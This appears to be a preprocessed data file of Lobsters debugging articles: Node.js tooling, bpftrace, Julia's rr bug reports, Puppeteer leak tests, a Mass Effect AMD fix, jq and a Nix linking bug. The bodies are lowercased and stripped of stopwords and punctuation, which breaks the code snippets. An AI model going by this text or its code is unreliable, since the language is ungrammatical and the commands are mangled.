32,Lobsters,debugging,Debugging,Let's Debug a Node.js Application,https://blog.heroku.com/debug-node-applications,let debug nodejs application,listen article rely complicated cli tooling analyze core dump pino winston chrome devtools ability inspect memory take heap snapshot creating logpoints nodejs guide inspector client ndb llnode video debug trace clarify video recording julianduque,listen article always challenge come debugging application nodejs asynchronous workflow add extra layer complexity arduous process although update made engine order easily access asynchronous stack trace time get error main thread application make debugging little bit difficult well nodejs application crash usually need rely complicated cli tooling analyze core dump article take look easier way debug nodejs application course developer toolkit complete without logging tend place consolelog statement code local development really scalable strategy production would likely need filtering cleanup implement consistent logging strategy order identify important information genuine error instead implement proper logoriented debugging strategy use logging tool like pino winston allow set log level info warn error allowing print verbose log message locally severe one production also stream log aggregator endpoint like logstash papertrail even slack logging take u far understanding application working way would expect sophisticated debugging session want use breakpoints inspect code behaves moment executed use node inspect node inspect debugging tool come nodejs actually implementation chrome devtools program letting add breakpoints control stepbystep execution view variable follow call stack couple way launch node inspect easiest perhaps call nodejs application inspectbrk flag node inspectbrk yourscriptname launching program head chrome inspect url chrome browser get chrome devtools chrome devtools capability normally expect debugging javascript browser one nicer tool ability inspect memory take heap snapshot profile memory usage understand memory allocated potentially plug memory leak rather launching program certain way many modern ides also support debugging node application addition many feature found chrome devtools bring feature creating logpoints allowing create multiple debugging profile check nodejs guide inspector client information ides another option install ndb standalone debugger nodejs make use devtools available browser isolated local debugger also extra feature nt available devtools support editinplace mean make change code updated logic supported directly debugger platform useful quick iteration suppose application crash due catastrophic error like memory access error may rare happen particularly app relies native code investigate sort issue use llnode program crash llnode used inspect javascript stack frame object mapping object cc side order use first need core dump program need use processabort instead processexit shut process code use processabort node process generates core dump file exit better understand llnode provide video demonstrates capability aside also thirdparty package recommend debugging first called simply enough debug debug assign specific namespace log message based function name entire module selectively choose message printed console via specific environment variable example nodejs server logging several message entire application middleware stack like sequelize express application express router set debug environment variable express router start program message tagged express router shown filtering message way hone single segment application behaving without needing drastically change logging code two module go together trace clarify trace augments asynchronous stack trace providing much detailed information async method called roadmap nodejs provide default clarify help removing information stack trace specific nodejs internals allows concentrate function call specific application neither module recommended running production enable debugging issue local development environment like follow along use debugging tool practice video recording provides detail includes live demo narrow problem code question find twitter julianduque
35,Lobsters,debugging,Debugging,Measuring USB with bpftrace,https://blog.habets.se/2020/08/Measuring-USB-with-bpftrace.html,measuring usb bpftrace,,example run usb stick idling appears probed every two second starting stopping gnuradio sniffing usrp sudo bpftrace usbbwb attaching probe total count average total sum usrp ettus research llc count average total sum usb mass storage devie usbest technology count average total total count average total sum usrp ettus research llc count average total total count average total sum usrp ettus research llc count average total sum usb mass storage devie usbest technology count average total total count average total sum usrp ettus research llc count average total total count average total sum usb mass storage devie usbest technology count average total sum usrp ettus research llc count average total total count average total sum usrp ettus research llc count average total total count average total sum usb mass storage devie usbest technology count average total sum usrp ettus research llc count average total total count average total sum usrp ettus research llc count average total total count average total sum usb mass storage devie usbest technology count average total sum usrp ettus research llc count average total total count average total sum usb mass storage devie usbest technology count average total prettiest interesting note product vendor id decimal find way convert hex bpftrace
36,Lobsters,debugging,Debugging,Julia 1.5 Feature Preview: Time Traveling (Linux) Bug Reporting,https://julialang.org/blog/2020/05/rr/,julia feature preview time traveling linux bug reporting,heisenbug http rrprojectorg technical report issue issue http pernosco previously announced,julia project like large open source project get large number bug report every day developer language try best responsive possible triage investigate fix bug quickly possible bug easy bug report well written problem evident getting fixed usually quick affair however large number report easy several common reason bug may go unaddressed extended period time example bug may reproduce deterministically may reproduce reporter machine sometimes known heisenbug bug report may incomplete specifying environment bug occurs making hard reproduce bug reporter may seen bug entirely sure caused making hard give reproducer making bug report largely unactionable bug may occur large project hard set bug may require specialized expertise diagnose eg missing gc root usually time expert high demand making time commitment required reproduce investigate bug prohibitive addition bug never get filed user may feel effort write highquality bug report high experience frustrating user encountering u often nt learn experience sometimes hear year later somebody may given project julia encountered crashing problem nt feel qualified reduce concise bug report subsequently gave using julia project lastly nt want expect user expert bug reporter often working scientist good programmer may background software engineering valuable user want make sure bug addressed past user encounter particularly difficult problem long time one answer reproduce linux machine get u trace rr tool http rrprojectorg probably get fixed rapidly uninitiated rr linux debugging tool originally developed mozilla robert ocallahan others tool known time traveling debugger reverse execution engine essentially rr split reproducing bug two phase record replay record phase performed bug reporter phase rr creates perfect record execution including bitwise exact memory register state every instruction trace analyzed replay phase performed different developer different machine capability like long imagined academia extremely hard achieve way introduce large overhead distort regular execution rr first tool experience performant enough used regular course development worth discussing achieved limitation approach first let take capability granted take look workflow enables julia released week new command line flag bugreportrr automatically create upload rr recording example usage shown animation start post creates deliberate crash unsafely dereferencing bad pointer however summarize bug reporter pass bugreportrr julia instance reproduces whatever bug attempting reproduce julia exit crash bug reporter prompted authorize upload clicking link githubbased authentication used abuse protection get back link include filing bug report julia package developer use link obtain recording analyze machine addition manual mechanism also switching linux ci system automatically create rr trace execution way ci run fails guaranteed able debug bug report includes link rr trace theory reproduction instruction required rr trace guaranteed perfectly capture environment bug reproduced course bug something nonobvious like unexpected behavior comment expected behavior may still helpful perfect reproducibility almost immediately knock common problem started post work longer available answer trace broke somebody machine debugged heisenbug longer issue captured rr always debugged even solves busyexpert problem allows nonexperts help triage report contain rr trace developer particular nonexperts attempt reproduce bug create trace even expert still required final diagnosis rr trace order magnitude faster plain bug report computer fundamentally deterministic machine given equivalent state input instruction produce deterministic state output subtle execution difference come produce diverging execution prevent bug reproducing well complete answer complicated lot detail roughly split size input state naively state encompasses least entire hard drive memory least large bit state right could potentially cause difference execution really want figure state relevant since large probably many bit send somebody input asynchronous event mean user input data network via nics device also mean thing like timing interrupt execution ordering data race multithreaded execution direct observation nondeterministic hardware effect ie qualifier includes instruction deliberately nondeterministic rdrand generates random number also includes observable undesirable effect hardware state eg timing side channel cache branch predictor state however theory tool able capture relevant state category could repeatedly generate exactly memory image novel idea devil detail discussing detail beyond scope particular post taste asynchronous event define event happened respect rest execution ie correct notion time real time nt work instruction issue frequency nt constant addition usual issue dealing time probably convenient thing use would number retired instruction challenge depending hardware discussed bit hardware section summarize input state simathcal output state determined pure deterministic function iip si mathcal ip mathcal iip corresponding instruction executed time iii asynchronous event aimathcal ai si asynchronous event occurred time iiip si otherwise mathcal begin case mathcal text asynchronous event occurred time mathcal text ip mathcal text otherwise end case iip asynchronous event occurred time help oh well made feel better physic degree also told research least one equation go also people worked really hard get equation rendering working blog better use anyway ah yes rr one key trick us reuse abstraction boundary already exists application underlying operating system specifically linux kernel exploiting abstraction boundary determinism boundary relying determinism apply change made internal application explicitly recording change made kernel lot advantage one kernel isolates lot state part disk state eg file nt requested kernel guaranteed nt affect process state assuming kernel work correctly course abstract hardware detail provides uniform interface resource like network also isolates process another one process interest eg julia activity relevant recovered said scheme also introduces complication order function rr must extremely precise model operation kernel way interacts userspace linux developer work hard attempt keep interface stable application put stringent constraint promise rr sometimes even single bit difference kernel behavior problematic detail interest recommend reading robert technical report deeper overview rr design point though even scratch surface one final thought section origin term timetraveling debugger stem mode analysis system like enables traditional debugger possible execute one instruction time step memory state memory state forward direction system like rr allow opposite replay step backwards state system hood accomplished playing forward beginning likely intermediate checkpoint created performance reason previous state reached however end user illusion going backwards time presented extremely useful mental model debugging previous section described operating principle rr justice reason rr work well reason simple performance overhead recording single threaded process generally often lower purely numerical calculation higher workload interact o recording multiple thread process share memory opposed using kernelbased message passing harder default rr serializes ie run one rather parallel execution task general required correctness since possible observe record interleaving memory operation shared memory space result sharedmemory application likely incur overhead linear number concurrent thread thus good idea try reproduce issue low core count interesting academic thinking high efficiency parallel recording shared memory application nothing even close production ready caveat mind real benchmark number overhead julia test suite seen ci test suite mostly us messagepassing based parallelism running multiple test parallel thread test incurs shared memory overhead penalty plot overhead recording test julia test suite entire test suite mean overhead ie average recorded test took longer non recorded test say rather expected thread test worst offender overhead however lot computational benchmark eg linearalgebra sparsearrays show little overhead expected test spend lot time user space require data recorded might wonder test ran faster rr investigated detail believe measurement artifact runtime test depend code previously ran worker since common code result cached since work assigned greedily worker change schedule sometimes result test running worker already cached work would otherwise necessary run test additionally fortunately u mean slow testbytest basis overall runtime test suite dominated lowoverhead purely computation test plus separate run thread test result increase total time running test suite rr attributable almost entirely thread test alone surprisingly trace may often quite small total compressed size trace full run test suite minute core three gigabyte point comparison significantly smaller even fullmemory coredump would end test suite run around though probably decently well compressible standard technique trace reproduce coredump every single trillion intermediate state already mentioned rr currently work linux however restriction moment chip intel microarchitecture supported rr relies hardware performance counter establish precise accurate notion time asynchronous event hardware counter available precise enough recording using rr work others investigated whether would possible port rr architecture best knowledge current thinking follows amd ryzen microarchitecture seems potentially possible amd performance counter le accurate found intel chip may possible compensate software inaccuracy illunderstood help investigation welcome issue llscbased atomics introduce additional problem since various external factor interrupt descheduling etc observed sc abort proper hardware support would possible work around hardware support appeared inaccurate older generation chip removed recent generation one said microarchitectures varied evidenced experience quality implementation relevant hardware support vary quite bit microarchitecture investigation hardware capability various microarchitectures would welcome issue looked rr found several large supercomputer run julia job similar issue since also llsc architecture well supporting hardware transactional memory theory believe hardware exists compensate issue preliminary investigation suggests hardware accurate enough support rr said understand active discussion ibm determine whether analysis correct one additional point complication experience quite common hypervisors used cloud vendor disable cpu capability required rr rendering incapable functioning inside virtual machine rr appears work fine latest generation amazon aws machine certain size google gcp microsoft azure lastly nt fail mention gpus gpus heavily utilized julia user currently supported rr changing tricky gpus often allow direct memory access device userspace program recorded interface gpu known definitely mitigated potentially performance cost eg double buffering gpus open source driver eg amdgpu active community interest building solution easy task think decent chance succeeding since open source driver allow insight exactly gpu work modify process memory gpus proprietary driver lot harder one interface userspace necessarily known additionally proprietary driver tend lot le well behaved open source one linux kernel review process tends filter egregious behavior example proprietary driver observed use userspace stack scratch space gpus use large number julia user hope work relevant vendor bring capability platform may long road summary new capability currently supported intel chip however bit chickenandegg problem hardware requirement nontrivial egregious hardware vendor cared problem could definitely build hardware enabled rr work really cared could build hardware assist feature make rr much faster without significant user base feature little incentive care hoping rolling capability widely incentive start presenting judging size community discounting use unsupported hardware operating system number user feature available likely number hundred thousand nt super large hardware vendor standard nt trivially small either hardware vendor interested making work happy talk mentioned already progress nature rr trace contain file touched process lifetime particular may contain thing like julia history process environment including secret may automatically adding bashrc similar configuration file system secret entered read ie make sure use sshagent reproducer involves using ssh authentication private code may using etc investigating building tooling help understand trace anonymize part trace potentially sensitive otherwise affect trace moment disable reading history default creating rr trace using history explicitly opted necessary reproduction nevertheless please make sure system administrator permission using bugreport feature sure recommend creating reproducer sanitized isolated environment eg docker container alternatively bugreport option creates public upload default user access professional julia support eg employer supercomputing center similar may able request mechanism share trace generated feature privately able replay trace beginning like say rr debugging becomes data analysis problem since answer question could possibly ask program already contained trace becomes question extracting answer default rr drop gdb gdb unlikely correct frontend analysis rr original author robert ocallahan startup working nextgeneration frontend http pernosco affiliation work made much possible plug least said julia tends pretty good tool data analysis idea frontend may look like notebook style ability generate plot time x space state recording lot cool thing done name checking assertion fact validating gc rooting accuracy fact performance analysis super precise coverage testing etc fact recording enables analysis technique would prohibitively expensive real time topic another time essentially company mentioned blog post past provided financial support julia project particular intel ibm past supported julia project financially improve support respective architecture amazon google microsoft provided cloud computing credit well intel google microsoft also previously sponsored juliacon work primarily funded employer julia computing part julia computing open source work funded external grant part work funded grant moore foundation gratefully acknowledged part work funded contract intel improve stability multithreading julia intel platform additionally hardware bug encountered work reported relevant vendor existing funded contract julia computing previously announced rr integration likely available future commercial offering separate piece work julia computing product interested using capability julia computing product julia computing support agreement please contact support representative lastly author discloses selfinterest spends much time trying get bug report reproduce rr fixed yall would swell
38,Lobsters,debugging,Debugging,Remake - GNU Make with comprehensible tracing and a debugger,http://bashdb.sourceforge.net/remake/,remake gnu make comprehensible tracing debugger,remake gnu make comprehensible tracing debugger python python gnu bash z shell korn shell perl nodejs excerpt example showing example showing short option example showing short option example showing kcachegrind source code video,remake gnu make comprehensible tracing debugger remake enahanced version gnu make add improved error reporting better tracing profiling debugger latest version based gnu make source although version available based also cool debugger python python gnu bash z shell korn shell perl nodejs excerpt example showing task example showing trace short option x example showing showparent short option c example showing profile output displayed via kcachegrind source code video
39,Lobsters,debugging,Debugging,Automatically detect memory leaks with Puppeteer,https://media-codings.com/articles/automatically-detect-memory-leaks-with-puppeteer,automatically detect memory leak puppeteer,bronley plumb skip right end standardizedaudiocontext puppeteer chrome devtools protocol pagemetrics comment github issue heapprofiler blog pagequeryobjects subtle bug andrey lushnikov countobjects function mocha hook memory leak test reported memory leak opensource project,half year ago bronley plumb kindly made aware memory leak one opensource package see memory leak action necessary open browser dev tool execute manual step top memory inspected manually complicated procedure normally add failing test fix bug time bit tricky end found way test memory consumption automatically came withif interested adventurous path led solution feel free skip right end read therein general memory leak situation software hold piece memory nt really need anymore javascript likely mean reference object somewhere totally forgot garbage collection impossible distinguish object still use forgotten somewherehistorically memory leak something web developer care every link page caused new page loaded turn wiped memory memory leak usually shy become noticeable particular program keep running long timewith today single page application progressive web apps situation changed many website behave like apps designed run long time particularly true apps use web audio api memory leak question found standardizedaudiocontext library achieve cross browser compatibility apithe simple example memory leak could think attaching metadata object let say couple object want store metadata nt want set property object want keep metadata separate placethis solved using map shown following snippet allows store metadata get back delete needed map us object key index metadataconst map new map mapset obj metadata mapget obj mapdelete obj object metadata referenced anywhere else anymore still ca nt garbage collected map still reference index metadatathe following example course contrived many memory leak reduced something simple thisconst map new map setinterval const obj mapset obj metadata created object survive every garbage collection map still reference perfect use case weakmap reference held weakmap prevent object garbage collectedconst map new weakmap setinterval const obj mapset obj metadata replacing map weakmap common cause memory leak eliminated problem caused memory leak code similar although obvious spotpuppeteer tool used remote control chrome chromium browser simpler alternative selenium webdriver downside work browser based chromium come access apis accessible selenium try interact website like real user puppeteer hand access many apis accessible normal user work utilizing chrome devtools protocol one thing puppeteer selenium ca nt inspecting memory course super helpful trying find memory leaksat first glance seems function api puppeteer offer needed track memory usage pagemetrics method among thing also return metric called jsheapusedsize number byte javascript engine used chrome us memoryconst jsheapusedsize await pagemetrics unfortunately getting size memory enough memory javascript program managed autonomous garbage collection unlike garbage collection real world usually show strict well known schedule javascript garbage collection job whenever think right time normally triggered within javascript code necessary make sure ran inspecting memory sure trash picked memory consumption computed based latest change made codehowever puppeteer least version dedicated method trigger garbage collection according comment github issue fairly easy implement author suggests use internal devtools client interact heapprofiler directlyconst client await pagetarget createcdpsession await clientsend heapprofilerenable await clientsend heapprofilercollectgarbage await clientsend heapprofilerdisable interacting raw devtools client course bit fragile puppeteer maintains api nt give guarantee keeping devtools protocol consistent functionality heapprofiler still marked experimental may changed even removed time using hack robust solutionbesides fragile hack also able get consistent result executing three command therefore tried different way trigger garbage collectionwhen taking snapshot heap garbage collection triggered implicitly tried programmatically create snapshot shown following snippetconst client await pagetarget createcdpsession await new promise resolve const resolvepromise finished finished clientoff heapprofilerreportheapsnapshotprogress resolvepromise resolve clienton heapprofilerreportheapsnapshotprogress resolvepromise clientsend heapprofilertakeheapsnapshot reportprogress true nt work sure call garbage collection nt producing consistent result expectedi went try something different according stack overflow answer possible specify flag launching puppeteer one flag meant tell expose garbage collectionawait puppeteerlaunch args jsflags exposegc possible call magic gc function attached global window objectawait pageevaluate gc feel le hacky using internal devtools protocol client puppeteer nt able get consistent resultsi wondered result test varied much even using simple code snippet memory usage different changed one parameter test caseafter time occured memory usage seemed depend number iteration ran make sure nt memory leak executed piece code several time expectation memory consumption remain unchanged word memory consumption executing code piece code testing ran completionbut relationship memory usage number iteration however linear relationship one would expect case actual memory leak number memory increased others remained almost stable even others shrinked concluded might testing something least one level deep well every javascript engine complex try optimize code execute much possible team example blog post regular article new optimization applyif create object javascript guarantee much memory using browser javascript engine may choose store extremely memory efficient way first use heavily browser might decide switch alternative version consumes space machine much faster access know think exactly problem ran memory consumption changed depending number time ran code wanted inspect sometimes optimized code different way turn change memory footprint store state inside memory javascript object make size memory even le predictable would option study internals compensate optimization measuring memory optimization get refined regularly would make test brittle rely thatbut even could manage make sense number returned pagemetrics another problem would make test flaky puppeteer operating asynchronously use two separate method collect garbage measure memory ca nt sure nothing happened two function thus absolutely possible memory allocated meantime corrupts result returned pagegetmetrics luckily puppeteer offer simpler better way one go provides method query object given prototype called pagequeryobjects shown following function take prototype count object prototype somewhere prototype chain case used objectprototype javascript almost everything inherits notable exception rule object created without prototype using objectcreate null primitive valuesconst countobjects async page const prototype await pageevaluatehandle return objectprototype const instance await pagequeryobjects prototype const numberofobjects await pageevaluate instance instanceslength handle await prototypedispose await instancesdispose return numberofobjects technique independent number byte object occupy heap count number think least good start testing memory leak javascript codefinally found way get consistent result best thing also trigger garbage collection internally counting object way nt use one hacky solution mentioned aboveup version subtle bug puppeteer thankfully fixed andrey lushnikov many thanks back using countobjects function really work expected case anymore using puppeteer version onwardsi personally prefer mocha running test setup testing library fairly similar many testing library mocha provides hook triggered test used launch browser puppeteer close test donedescribe memory leak test let browser let context let page async browser await puppeteerlaunch beforeeach async context await browser createincognitobrowsercontext page await contextnewpage aftereach contextclose browserclose code launch browser first test close last test addition creates new context page every single test also close context testwith boilerplate place use countobjects function write actual memory leak test like memory leak async const numberofobjects await countobjects page await pageevaluate expect await countobjects page toequal numberofobjects finally solution test memory leak automated wayin case interested feel free explore memory leak test wrote standardizedaudiocontext library make sure reported memory leak never come backif encounter bug opensource project please report often start project part work client maintenance usually done free time reason sometimes take little longer fix bug even take half year comitted fix bug find
43,Lobsters,debugging,Debugging,Fixing Mass Effect black blobs on modern AMD CPUs,https://cookieplmonster.github.io/2020/07/19/silentpatch-mass-effect/,fixing mass effect black blob modern amd cpu,download introduction mass effect disabling lighting via console command modifying game map remove broken light processor instruction set part research prelude rafael rivera psgp rafael rivera guide enabling applicationspecific flag pix capture carry bug similar looking issue come straight unreal engine part closer look part standalone test intel amd intel amd directxmath work fine intel amd part putting together silentpatch mass effect download download silentpatch mass effect setup instruction see source github,tl dr interested indepth overview wrong game fixed scroll download section download link introduction mass effect popular franchise scifi roleplaying game first game initially released bioware late xbox exclusively part publishing deal microsoft month later game received pc port developed demiurge studio decent port obvious flaw amd released new bulldozerbased cpu playing game pc modern amd processor two area game noveria ilo show severe graphical artifact well nt look nice unplayable definitely distracting thankfully workarounds exist disabling lighting via console command modifying game map remove broken light seemingly issue never fully understood source claim fps counter mod also fix issue find much information mod source seem available online documentation mod tackle error make issue particularly interesting vendorspecific bug nothing new game decade however best knowledge case graphical issue caused processor graphic card majority case issue happen specific vendor gpu care cpu case exact opposite make issue unique worth looking looking existing discussion online issue seems affect amd fx ryzen chip compared older amd chip lack instruction set unrelated community consensus cause bug game tried use instruction upon detecting amd cpu given known case bug occurring intel cpu instruction exclusive amd surprise community assumed issue really issue caused something entirely different let find part research prelude even though issue trivial reproduce look longest time simple reason access pc amd hardware thankfully time approaching research alone rafael rivera got back entire process r providing test environment amd chip insight idea well putting hundred blind guess usually throw around trying find way root unknown problem since good testing environment first theory test course cpuid people right assuming instruction blame place game code check presence least check cpu vendor reasoning flawed though true game attempt use instruction time run amd chip without checking supported game would likely crash trying execute illegal instruction moreover quick scan around game code reveals game check cpu capability therefore whatever issue appear caused game misdetecting cpu feature seemingly care first place started looking like undebuggable case rafael came back realization disabling psgp processor specific graphic pipeline fix issue character properly lit psgp best documented term short legacy concerning older directx version feature allowing perform processorspecific optimization previous version directx path allowed vertex processing called psgp application take path account support path vertex processing processor graphic core putting way make sense disabling psgp fix artifact amd path taken modern amd processor may somehow broken disable two way come mind possible pas flag createdevice defined restrict computation main application thread flag set runtime may perform software vertex processing computation worker thread improve performance multiprocessor system sadly setting flag fix issue look like despite flag psgp name looking directx specifies two registry entry disable psgp disable psgp disablepsgp flag set systemwide processwide information set specific process see rafael rivera guide enabling applicationspecific flag appears viable fix issue therefore aversion towards downloading third party fixesmodifications must fix issue without making change game perfectly fine way long set flag mass effect systemwide fine pix always graphical issue pix likely useful tool one could use diagnose captured similar scene intel amd hardware compared result one difference instantly noticeable unlike past project capture carry bug capture would look different different pc indicating driver bug capture carry bug word capture amd hardware opened pc intel hardware show bug amd capture intel look different hardware taken tell u since pix take screenshots instead capture sequence command executes hardware observe executing command captured amd box result bug executed intel strongly implies difference caused difference command executed get gpu specific bug command executed word almost certainly sort driver bug instead way input gpu prepared seems somehow broken indeed rare occurrence point finding bug matter finding jarring difference capture tedious viable way long spent poking capture full body draw call caught attention intel capture draw output character body together lighting texture amd capture output plain black model look like good trail first obvious candidate checking would bound texture seem fine consistent across capture however pixel shader constant looked weird nan number also seem appear amd capture intel capture qo indicates nan look promising nan value causing strange visuals unheard funnily enough playstation version mass effect similar looking issue also related nan however get excited value could leftover previous draw might end unused current draw luckily case clearly visible nan get submitted specific setvertexshaderconstantf setvertexshaderconstantf setpixelshaderconstantf submits constant setpixelshaderconstantf submits constant setrenderstate setrenderstate setrenderstate setrenderstate testcooperativelevel setindices drawindexedprimitive draw character model pixel shader used draw reference constant register name reg size upperskycolor lowerskycolor constant appear come straight unreal engine judging name might directly influence lighting bingo quick ingame test confirms theory intel machine vector nan value never submitted pixel shader constant meanwhile amd machine nan would start showing soon player entered area lighting break mean work done far finding broken constant half success question remains come replaced ingame test replacing nan value zero partially fixed issue ugly black blob disappeared character still way dark almost correct quite given important light value might scene feasible settle workaround like know right track though sadly attempt track origin constant pointed towards something resembling render thread real place submission undebuggable clear needed try fresh approach potentially spending infinite amount time following data flow gamespecific andor structure part closer look taking step back realized overlooked something earlier recall fix issue one two registry entry added disablepsgp assuming naming misleading subset disablepsgp former disabling psgp latter disabling assumption turned sight mass effect import set function linking looking list approached without prior knowledge gained capture would expected possible culprit shaders could wrongly optimized andor compiled amd fixing could insanely challenging however current knowledge one function stand list function could reasonably used prepare pixel shader constant function called one place game int thiscall invertmatrix void int return well made though quick peek inside reveals touch output parameter return nullptr matrix inversion fails due input matrix singular yet game care output matrix might left uninitialized boo inverting singular matrix indeed happen game frequently main menu matter attempt make game handle better eg zeroing output setting identity matrix visuals change oh well theory debunked back psgp psgp exactly rafael rivera looked logic behind turn quite simple addfunctions disablepsgp optimization turned else isprocessorfeaturepresent getfeatureflags mmx getfeatureflags addfunctions getfeatureflags addfunctions getfeatureflags sse addfunctions amdsse else isprocessorfeaturepresent addfunctions else isprocessorfeaturepresent pfxmmiinstructionsavailable sse addfunctions intelsse unless psgp disabled pick function optimized make use specific instruction set make sense tie back original theory turn function optimized amd instruction set game indirectly making use instruction removed modern amd processor take code path intel processor summarize disabling psgp make intel amd take regular code path intel cpu always take code path amd cpu supporting take code path cpu without take code path information put forward hypothesis something possibly wrong amd instruction result matrix inversion calculated amd path either inaccurate completely incorrect verify hypothesis test course p may thinking well game us newest library surely must fixed later revision tried verify upgrading game link newest dll nothing changed part standalone test prepared simple standalone program verify precision matrix inversion short game session bugged game area recorded every input output file later file read standalone test program result recalculated verify correctness output game compared output calculated test program several attempt basing data collected intel amd chip psgp enableddisabled crosschecked result machine result follows indicating success result equal indicating failure result equal last column indicates whether game handle data fine glitch deliberately take imprecision floatingpoint math account instead compared result memcmp data source intel amd intel amd accepted game intel amd intel amd test result interesting result show calculation transfer across intel amd machine calculation without transfer across machine calculation without accepted game despite identical one intel raise question exactly wrong calculation amd end glitching game precise answer seems product two factor implementation might poor numerically seems like instruction give different result intelamd possibly different rounding mode function written way would help mitigate inaccuracy game code written way sensitive accuracy issue point ready put forward fix would replace rewrite variation function call day however proceeding one random idea deprecated got replaced directxmath figured since replace matrix function anyway could try replacing xmmatrixinverse modern replacement xmmatrixinverse also us instruction equally optimal function nearly sure would break way hacked together quickly sent rafael work fine sure issue coming tiny difference instruction may purely numerical issue despite also using xmmatrixinverse gave perfect result intel amd therefore reran test result surprising say least data source intel amd accepted game intel amd test result xmmatrixinverse game work fine result perfectly identical transfer across machine mind revised theory behind bug without doubt game fault sensitive issue additional test seems like may written fast math mind directxmath may care precise calculation make sense product perfectly reasonable written performance main priority directxmath luxury engineered later could put attention towards precise deterministic computation part putting together took get hope still bored death summarize went verified game use instruction directly system dlls found disabling psgp fix issue amd processor using pix found culprit nan value pixel shader constant nailed origin value fuzzed function found give consistent result intel amd cpu instruction used accidentally found xmmatrixinverse flaw viable replacement thing left implement proper replacement silentpatch mass effect appears decided cleanest way fix issue provide replacement forward every function exported mass effect system dll except function developed replacement using xmmatrixinverse replacement dll make clean bulletproof installation confirmed work fine origin steam version game work box without need asi loader third party software best knowledge game look exactly without downgrade lighting noveria ilo download modification downloaded mod patch click head game page directly download silentpatch mass effect downloading need extract archive game directory sure proceed check setup instruction interested full source code mod published github freely used point reference see source github
44,Lobsters,debugging,Debugging,Mastering JQ: Part 1,https://codefaster.substack.com/p/mastering-jq-part-1-59c,mastering jq part,jq pretty print json debug eyeball select json data transform json data jq manual array filter length reverse add map map map select filter flatten array constructor object filter key toentries fromentries object constructor transform newline delimited data multiple result reading multiple value pretty printing multiple result jq aka slurp jq r aka raw string output jq r aka raw string input jq aka antislurp reading newline delimited data writing newline delimited data conclusion,first part ongoing series mastering jq series assume prior experience jq assume basic fluency shell programmingjq valuable tool every fast coder tool chest contains depth immense power part start basicsfor application jq lead example copy paste shell see work rest section discus application detailpretty print jsonecho jq one valuable application jq also easiest use pretty printing jsonpass desired json stdin jq print pretty print json stdout jq pretty printing add shape color data shape color make data much faster read debug discussed debug eyeball one caveat jq render color jq output piped another command file example echo string jq json data large pipe le r render color properly echo string jq le rhowever notice color get color back use jq c flagecho string jq c le rselect json dataecho jq pretty print json data make easier read like go one step see relevant data jq yes jq select json data pretty print understand select relevant data need understand jq work little bitjq run following algorithmparse json value stdin set initial resultfor function apply function result set output result next functionthe final result pretty printed stdoutlet run example see jq performs selectionecho jq initial result jq applies selector result jq applies selector result jq applies selector result jq applies selector result final result therefore pretty printed stdout selector find useful identity selector return whole value jq pretty print whole value passed stdin key key string result isa json object key present return object key value json object key present return nullnot object jq return error keywithspecialcharacters like key work even string contains special character n n number result json array nth element present return nth elementa json array nth element present return nullnot array jq return error n n numberslet l length result array applicable result json array l subarray returneda json array n l subarray n l returneda json array l n empty array returnedif result array jq return error equivalent n equivalent n l l length arraytransform json dataecho n bob v n jim v jq map name n value v sometimes data want see suboptimal structure viewing want select want transform structure selector special case filter jq rich powerful collection filter transform data jq manual specifies different filter transform json data highlighted filter find useful along example run shell read jq manualarray filterslengthecho jq lengthgets length arrayreverseecho jq reversereverses arrayaddecho jq addsums element arraymapecho jq map map map functional programmingmap selectecho jq map select map select filter functional programmingflattenecho jq flattenflatten flatten functional programming flattens list list single listarray constructorecho jq using make array manuallyobject filterskeysecho jq keysreturns array key object especially useful object big key determined looking datatoentriesecho jq toentries toentries turn object array key value pairsfromentriesecho key value key value jq fromentries fromentries inverse toentries turn array key value pair objectobject constructorecho jq using make objectstransform newline delimited dataseq jq addso far used jq json data data format use jq well jq built support newline delimited data let start thereto use jq newline data need understand jq handle multiple resultsmultiple resultsi lied earlier said jq applies filter single json result actually multiple json result jq applies filter result independently pass result next filterreading multiple valuesmultiple value passed jq delimiting value whitespace including newline technically case delimiter needed value impact discussionpretty printing multiple resultsfor every final result jq print stdout newline delimitedto use jq newline data also need know jq flag one jq filterjq aka slurp echo jq jq read stdin multiple value combine single array practice use combine newline delimited result single resultjq r aka raw string output compareecho jq f return f toecho jq r f returnsfthe quoted f json string unquoted f raw string jq r pretty print result type string quoted json string raw stringjq r aka raw string input echo string jq r jq r interprets stdin json string delimited newlinesjq aka antislurp echo jq filter take array result split multiple resultswith ready handle newline delimited datareading newline delimited dataif input newline delimited number saw example use slurp seq jq data newline delimited string also need use raw string input however use slurp raw string input together jq par entire input single raw string need call jq twice quote string second time slurp single arrayecho e stringnstring jq r jq writing newline delimited datato output array number newline delimited number use antislurp echo jq output array string newline delimited string also need use raw string output echo jq r b c conclusionthis concludes first step mastering jq far seen jq pretty print jsonselect json datatransform jsontransform newline dataall way using jq discussed jq manual readily available easy find future installment dig deeper uncover hidden power jq power discussed manual want miss click subscribe button
45,Lobsters,debugging,Debugging,Debugging a dynamic linking bug in a Nix project,https://www.johnbcoughlin.com/posts/nix-dynamic-linking/,debugging dynamic linking bug nix project,debugging dynamic linking bug nix project trying nix development experience scientific project nix direnv wrapping c compiler override default petsc derivation nix pill whither linker edit keep filed ticket section installname depravity section helpful blog post gotcha petsc derivation line post epilogue first contribution,debugging dynamic linking bug nix project trying nix development experience day building scientific project contributor ran nasty version conflict two system library fit pique decided learn enough nix able set reproducible tightly controlled local build done overall happy tooling setup using direnv tightly integrate normal shell nix nixshell feature part everything feel seamless extremely refreshing see cmake report found plethora binary library contenthashed installed neat little row nixstore using nix manage development environment build project nix ensures project dependency installed discoverable compiler linker building project done cmake set cmake find nixinstalled library nix achieves wrapping c compiler shell script injecting path library binary via environment variable little make cmake work beyond declaring package want buildinputs first version shellnix file looked like file shellnix pkgs import nixpkgs pkgsmkshell buildinputs pkgs cmake callpackage nixpetscnix metis openmpi package packagesnumpy using setup little trouble getting project build override default petsc derivation compile metis openmpi support hard file nixpetscnix petsc blas gfortran lapack python metis openmpi petscoverrideattrs oldattrs rec nativebuildinputs blas gfortran gfortrancclib lapack python openmpi metis preconfigure export fc gfortran bingfortran gfortran bingfortran patchshebangs configureflagsarray configureflagsarray withmpidir openmpi withmetis metis withblaslib blas liblibblasso gfortrancclib liblibgfortrana withlapacklib lapack libliblapackso gfortrancclib liblibgfortrana nix file return function invoked shellnix using callpackage function petscoverrideattrs neat way override attribute derivation created stdenvmkderivation building petsc mpi metis support simple passing different set argument configure script figuring fun mostly referred nix pill great progression nix tool language nix file able execute cmake make successfully getting project run another story final binary failed immediately dynamic loading error binwarpxm dyld library loaded referenced usersjacksrcwarpxmbuildbinwarpxm reason image found binary trying load dynamic lib one temporary directory nix created process building petsc course failed time 